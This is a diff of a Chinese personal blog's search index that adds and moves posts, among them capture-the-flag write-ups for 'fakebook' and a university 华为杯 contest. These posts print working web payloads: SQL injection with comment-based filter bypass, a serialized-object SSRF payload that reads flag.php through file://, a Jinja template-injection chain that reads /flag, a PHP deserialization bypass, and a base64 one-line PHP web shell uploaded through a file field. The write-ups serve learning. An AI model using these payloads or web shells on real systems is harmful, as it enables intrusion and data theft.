@@ -103,10 +103,9 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/2022/09/09/Daily-Algorithm/</url>
-    <content><![CDATA[<p>title: Daily_Algorithm<br>date: 2022-07-29 13:08:13<br>tags: java,algorithm</p>
-<h1 id="每日刷题"><a href="#每日刷题" class="headerlink" title="每日刷题"></a>每日刷题</h1><p>leetcode每日刷题，先定个小目标300</p>
+    <title>Daily_Algorithm</title>
+    <url>/2022/07/29/Daily-Algorithm/</url>
+    <content><![CDATA[<h1 id="每日刷题"><a href="#每日刷题" class="headerlink" title="每日刷题"></a>每日刷题</h1><p>leetcode每日刷题，先定个小目标300</p>
 <p><a href="https://github.com/sunzhengyu99/Daily-Algorithm">项目地址</a></p>
 <h1 id="高级算法分析与设计课程作业"><a href="#高级算法分析与设计课程作业" class="headerlink" title="高级算法分析与设计课程作业"></a>高级算法分析与设计课程作业</h1><h2 id="作业一"><a href="#作业一" class="headerlink" title="作业一"></a>作业一</h2><h3 id="两数之和（力扣第1题）"><a href="#两数之和（力扣第1题）" class="headerlink" title="两数之和（力扣第1题）"></a>两数之和（力扣第1题）</h3><blockquote>
 <p>给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。</p>
@@ -450,6 +449,9 @@ ctf,ctf2,ctf3,ctf4,gbksqli,news</code></pre><p>0x637466 为十六进制ctf</p>
 &#125;</code></pre>
 
 ]]></content>
+      <tags>
+        <tag>java,algorithm</tag>
+      </tags>
   </entry>
   <entry>
     <title>guestbook</title>
@@ -1662,6 +1664,90 @@ password<span class="hljs-operator">=</span><span class="hljs-number">42</span><
       </tags>
   </entry>
   <entry>
+    <title>fakebook</title>
+    <url>/2020/09/27/fakebook/</url>
+    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
+<span id="more"></span>
+
+<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
+<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
+<p>接下来继续注入的常规操作。</p>
+<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
+<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
+<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
+<p><strong>爆表名</strong></p>
+<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
+<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
+<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
+<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
+<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
+<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
+<p>爆出一大堆列名。直接读取data的内容</p>
+<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
+<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
+<p>发现内容是注册时信息保存为序列化内容</p>
+<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
+<p>到这里就不知道怎么办了。。。</p>
+<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
+<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
+<p>源码</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
+    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
+    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
+    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
+&#125;
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$ch</span> = curl_init();
+
+    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
+    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
+    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
+    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
+    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
+    &#125;
+    curl_close(<span class="hljs-variable">$ch</span>);
+
+    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
+&#125;
+
+<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
+<span class="hljs-function"></span>&#123;
+    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
+    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
+&#125;
+&#125;</code></pre>
+<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
+<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
+<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>
+
+<p>查看源码，解base64。</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>unserailize</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>dockerpy</title>
     <url>/2022/05/15/dockerpy/</url>
     <content><![CDATA[<h1 id="Docker-py"><a href="#Docker-py" class="headerlink" title="Docker-py"></a>Docker-py</h1><p>使用python第三方库docker-py操作docker</p>
@@ -2008,90 +2094,6 @@ apt install <span class="hljs-keyword">vim</span></code></pre>
       </categories>
       <tags>
         <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>fakebook</title>
-    <url>/2020/09/27/fakebook/</url>
-    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
-<span id="more"></span>
-
-<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
-<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
-<p>接下来继续注入的常规操作。</p>
-<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
-<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
-<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
-<p><strong>爆表名</strong></p>
-<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
-<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
-<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
-<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
-<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
-<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
-<p>爆出一大堆列名。直接读取data的内容</p>
-<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
-<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
-<p>发现内容是注册时信息保存为序列化内容</p>
-<p>O:8:”UserInfo”:3:{s:4:”name”;s:5:”sunzy”;s:3:”age”;i:22;s:4:”blog”;s:12:”22.github.io”;}</p>
-<p>到这里就不知道怎么办了。。。</p>
-<h2 id="0x02审计源码"><a href="#0x02审计源码" class="headerlink" title="0x02审计源码"></a>0x02审计源码</h2><p>扫描一下目录发现了robots.txt，其中给出来了源码备份文件的路径</p>
-<p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" alt></p>
-<p>源码</p>
-<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
-<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>信息类</span>
-<span class="hljs-class"></span>&#123;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;
-    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;
-    <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;
-    <span class="hljs-keyword">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;
-&#125;
-
-<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) // 处理<span class="hljs-title">url</span></span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$ch</span> = curl_init();
-
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);
-    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
-    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);
-    <span class="hljs-variable">$httpCode</span> = curl_getinfo(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);
-    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;
-        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
-    &#125;
-    curl_close(<span class="hljs-variable">$ch</span>);
-
-    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;
-&#125;
-
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
-&#125;
-
-<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span>
-<span class="hljs-function"></span>&#123;
-    <span class="hljs-variable">$blog</span> = <span class="hljs-keyword">$this</span>-&gt;blog;
-    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);
-&#125;
-&#125;</code></pre>
-<p>审计源码发现其中get()函数存在SSRF(服务端请求伪造)漏洞。</p>
-<p><strong>思路：利用no参数进行注入，在反序列化中构造file文件协议，利用服务端请求伪造漏洞访问服务器上的flag.php文件。</strong></p>
-<pre><code class="hljs ada">?no=-<span class="hljs-number">2</span>%<span class="hljs-number">20</span>union/**/<span class="hljs-keyword">select</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;sunzy&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">22</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;%<span class="hljs-number">20</span>#</code></pre>
-
-<p>查看源码，解base64。</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>sql</tag>
-        <tag>unserailize</tag>
       </tags>
   </entry>
   <entry>
@@ -2996,6 +2998,20 @@ save</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>reggie</title>
+    <url>/2022/04/29/reggie/</url>
+    <content><![CDATA[<h1 id="瑞吉外卖项目"><a href="#瑞吉外卖项目" class="headerlink" title="瑞吉外卖项目"></a>瑞吉外卖项目</h1><p>黑马程序员最新的springboot课程中的项目</p>
+<p>项目地址为 <a href="https://github.com/sunzhengyu99/reggie">瑞吉</a></p>
+<p>代码全是跟着视频敲出来的，后面会对项目进行优化。</p>
+]]></content>
+      <categories>
+        <category>java</category>
+      </categories>
+      <tags>
+        <tag>springboot</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>scrapy</title>
     <url>/2021/03/31/scrapy/</url>
     <content><![CDATA[<h1 id="学习分布式爬虫第一天"><a href="#学习分布式爬虫第一天" class="headerlink" title="学习分布式爬虫第一天"></a>学习分布式爬虫第一天</h1><h2 id="xpath编写"><a href="#xpath编写" class="headerlink" title="xpath编写"></a>xpath编写</h2><p>xpath学习，谷歌商店下载<code>xpath helper</code>，可以大大提高效率</p>
@@ -3533,20 +3549,6 @@ ITEM_PIPELINES = &#123;
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502223115320.png" alt="image-20210502223115320"></p>
 <p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210502223132992.png" alt="image-20210502223132992"></p>
 ]]></content>
-  </entry>
-  <entry>
-    <title>reggie</title>
-    <url>/2022/04/29/reggie/</url>
-    <content><![CDATA[<h1 id="瑞吉外卖项目"><a href="#瑞吉外卖项目" class="headerlink" title="瑞吉外卖项目"></a>瑞吉外卖项目</h1><p>黑马程序员最新的springboot课程中的项目</p>
-<p>项目地址为 <a href="https://github.com/sunzhengyu99/reggie">瑞吉</a></p>
-<p>代码全是跟着视频敲出来的，后面会对项目进行优化。</p>
-]]></content>
-      <categories>
-        <category>java</category>
-      </categories>
-      <tags>
-        <tag>springboot</tag>
-      </tags>
   </entry>
   <entry>
     <title>sqlmap</title>
@@ -4313,6 +4315,121 @@ export default &#123;
       </tags>
   </entry>
   <entry>
+    <title>cumt华为杯</title>
+    <url>/2020/10/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/</url>
+    <content><![CDATA[<h1 id="cumt-华为杯"><a href="#cumt-华为杯" class="headerlink" title="cumt_华为杯"></a>cumt_华为杯</h1><p>经典的学长虐菜局，web只做出来一个，另外两题好不容易有思路了，都被卡死了</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="doge"><a href="#doge" class="headerlink" title="doge"></a>doge</h3><p>真签到题，抽个奖就给出了flag</p>
+<h3 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h3><p>刚进入页面，只有一张图片，查看源码也没发现什么</p>
+<p>就是了模板注入</p>
+<pre><code class="hljs handlebars"><span class="xml">url+</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><span class="xml">Copy</span></code></pre>
+
+<p>页面出现404报错，并且显示的是url+49，确定是模板注入</p>
+<pre><code class="hljs sqf">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">2</span>].<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
+查看模块时，发现存在waf
+经过测试发现是过滤了[]
+于是使用
+&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>()&#125;&#125;
+存在file模块
+用read读取文件内容
+<span class="hljs-built_in">exp</span>:
+<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>.<span class="hljs-variable">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-variable">__subclasses__</span>().pop(<span class="hljs-number">40</span>)(<span class="hljs-string">&#x27;/flag&#x27;</span>).read()Copy</code></pre>
+
+<p>参考链接：<a href="https://xz.aliyun.com/t/8029">https://xz.aliyun.com/t/8029</a></p>
+<h3 id="VulnCMS"><a href="#VulnCMS" class="headerlink" title="VulnCMS"></a>VulnCMS</h3><p>这题是真滴无语，开始以为是XSS，后来学长提示不是，又找到了文件上传的漏洞，直接拿到了网站根目录本以为做出了，结果提示flag not here,心态炸裂，但是提示了”投个稿？“，应该是在投稿位置下功夫吧。到最后也没做出了，但是找到了漏洞代码，应该是sql注入。</p>
+<p><a href="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png"><img src="https://i.loli.net/2020/10/25/usz3grOMb56lmPG.png" alt="cms.png"></a></p>
+<p>这里给出大神的做法</p>
+<p><a href="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png"><img src="https://i.loli.net/2020/10/25/mrLVelBfQdD28CA.png" alt="cms1.png"></a></p>
+<h3 id="Hodor"><a href="#Hodor" class="headerlink" title="Hodor"></a>Hodor</h3><p>这题基本上是原题，但是加了一层过滤，怎么都没绕过去。。。</p>
+<p>看到WP是大S绕过，涨知识了</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">Class</span> <span class="hljs-title">Source</span> </span>&#123;
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;
+        <span class="hljs-keyword">return</span> highlight_file(<span class="hljs-string">&#x27;license.txt&#x27;</span>, <span class="hljs-literal">true</span>).highlight_file(<span class="hljs-keyword">$this</span>-&gt;source, <span class="hljs-literal">true</span>);
+    &#125;
+&#125;
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">easy_check</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;
+    <span class="hljs-comment">//echo $str;</span>
+    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$str</span>, <span class="hljs-variable">$matches</span>)) &#123;
+        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))&#123;
+    <span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> Source();
+    <span class="hljs-variable">$s</span>-&gt;source = <span class="hljs-keyword">__FILE__</span>;
+
+    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;
+    <span class="hljs-keyword">exit</span>;
+&#125;
+<span class="hljs-variable">$todos</span> = [];
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>]))&#123;
+    <span class="hljs-keyword">if</span>(!easy_check(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>])) &#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!\n&quot;</span>;
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;todos&#x27;</span>];
+        <span class="hljs-variable">$h</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
+        <span class="hljs-variable">$m</span> = substr(<span class="hljs-variable">$c</span>, <span class="hljs-number">32</span>);
+        <span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$m</span>) === <span class="hljs-variable">$h</span>)&#123;
+            <span class="hljs-variable">$todos</span> = unserialize(<span class="hljs-variable">$m</span>);
+        &#125;
+    &#125;
+&#125;
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>]))&#123;
+    <span class="hljs-variable">$todo</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;text&#x27;</span>];
+
+    <span class="hljs-variable">$todos</span>[] = <span class="hljs-variable">$todo</span>;
+    <span class="hljs-variable">$m</span> = serialize(<span class="hljs-variable">$todos</span>);
+    <span class="hljs-variable">$h</span> = md5(<span class="hljs-variable">$m</span>);
+
+    setcookie(<span class="hljs-string">&#x27;todos&#x27;</span>, <span class="hljs-variable">$h</span>.<span class="hljs-variable">$m</span>);
+    header(<span class="hljs-string">&#x27;Location: &#x27;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>]);
+    <span class="hljs-keyword">exit</span>;
+&#125;
+<span class="hljs-comment">// flag is in flag.php</span>
+?Copy</code></pre>
+
+<p>exp</p>
+<pre><code class="hljs rust">echo md5(<span class="hljs-symbol">&#x27;a</span>:<span class="hljs-number">2</span>:&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:
+&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);
+echo urlencode(<span class="hljs-symbol">&#x27;ae5860e508aaf353a9ad78ac246f46fba</span>:<span class="hljs-number">2</span>:
+&#123;i:<span class="hljs-number">0</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;i:<span class="hljs-number">1</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Source&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;source&quot;</span>;S:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;\66lag.php&quot;</span>;&#125;&#125;&#x27;);<span class="hljs-built_in">Copy</span></code></pre>
+
+<p><a href="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png"><img src="https://i.loli.net/2020/10/25/hNxGEfI5lRaevUg.png" alt="hodor.png"></a></p>
+<p>参考</p>
+<p><a href="https://blog.csdn.net/SmileAndFun/article/details/108497183">https://blog.csdn.net/SmileAndFun/article/details/108497183</a></p>
+<h3 id="webcms"><a href="#webcms" class="headerlink" title="webcms"></a>webcms</h3><p>是一个博客管理的网站，其实也是个原题，考察点是文件上传</p>
+<p>漏洞点在图片中上传图片的位置</p>
+<p><a href="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png"><img src="https://i.loli.net/2020/10/25/qAB4ZnH23j98JaO.png" alt="webcms.png"></a></p>
+<p>随便上传一张图片试试，抓包结果如下，几个注意点</p>
+<p><a href="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png"><img src="https://i.loli.net/2020/10/25/71cSPbv6KuaUl35.png" alt="webcms2.png"></a></p>
+<blockquote>
+<p>1.filetype规定了文件的类型</p>
+<p>2.上传时，将图片保存为了base64形式</p>
+<p>所以上传一句话木马的时候要注意修改对应的位置</p>
+</blockquote>
+<p>一句话木马类型为php,则filetype改为php</p>
+<p>内容为密码为cmd一句话木马，对应的base64编码<code>PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==</code></p>
+<p><a href="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png"><img src="https://i.loli.net/2020/10/25/YdaDjZmzb8KX6rc.png" alt="webcms3.png"></a></p>
+<p>上传成功，访问保存的路径：<code>http://219.219.61.234:20203/upload/tmp/1_Y2R8AK57UWV4JBW.php</code></p>
+<pre><code class="hljs css">POST:
+cmd=<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;cat /flag&quot;</span>);
+或者蚁剑连接，密码cmdCopy</code></pre>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><p>MIsc部分基本都是队友做的，好像也不是太难</p>
+<h3 id="伪web"><a href="#伪web" class="headerlink" title="伪web"></a>伪web</h3><p>真是伪web。。。</p>
+<p>直接在文件里搜索就能到flag</p>
+<p>搜索关键词cmut，flag所在文件夹为html\include\include.php</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>unserialize</tag>
+        <tag>ssti</tag>
+        <tag>文件上传</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>xss和sql注入简单环境的搭建</title>
     <url>/2020/11/15/xss-sql/</url>
